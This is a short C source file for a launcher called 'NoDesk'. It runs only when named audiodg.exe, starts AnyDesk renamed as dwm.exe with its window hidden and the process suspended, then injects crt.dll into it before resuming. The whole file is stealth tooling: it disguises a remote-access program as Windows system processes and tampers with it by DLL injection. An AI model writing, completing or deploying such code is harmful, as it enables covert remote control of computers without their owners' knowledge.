#include "NoDesk.h"

#include "NoDesk/strings.h"
#include "NoDesk/process.h"

#define TARGET_LAUNCHER L"audiodg.exe"
#define TARGET_EXE L"dwm.exe"

HINSTANCE hInst;
WCHAR szSelfFilename[MAX_PATH];

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	hInst = hInstance;
	GetModuleFileNameW(hInst, szSelfFilename, MAX_PATH);
	if (wcscmp(PathFindFileNameW(szSelfFilename), TARGET_LAUNCHER) != 0) {
		return 0;
	}

	LPCWSTR szDll = L"crt.dll";

	if (!PathFileExistsW(szDll)) {
		DEBUG(L"[NoDesk] Launcher: crt.dll not found.");
		return 0;
	}

	STARTUPINFOW si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	WCHAR szCommandLine[MAX_PATH] = TARGET_EXE;

	if (!PathFileExistsW(szCommandLine)) {
		DEBUG(L"[NoDesk] Launcher: AnyDesk not found.");
		return 0;
	}

	if (!CreateProcessW(NULL, szCommandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		DEBUG(L"[NoDesk] Launcher: CreateProcess failed with %lu", GetLastError());
		return 0;
	}

	if (InjectDllToProcess(szDll, &pi)) ResumeThread(pi.hThread);
	else {
		DEBUG(L"[NoDesk] Launcher: CreateProcess failed with %lu", GetLastError());
	}

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return 0;
}
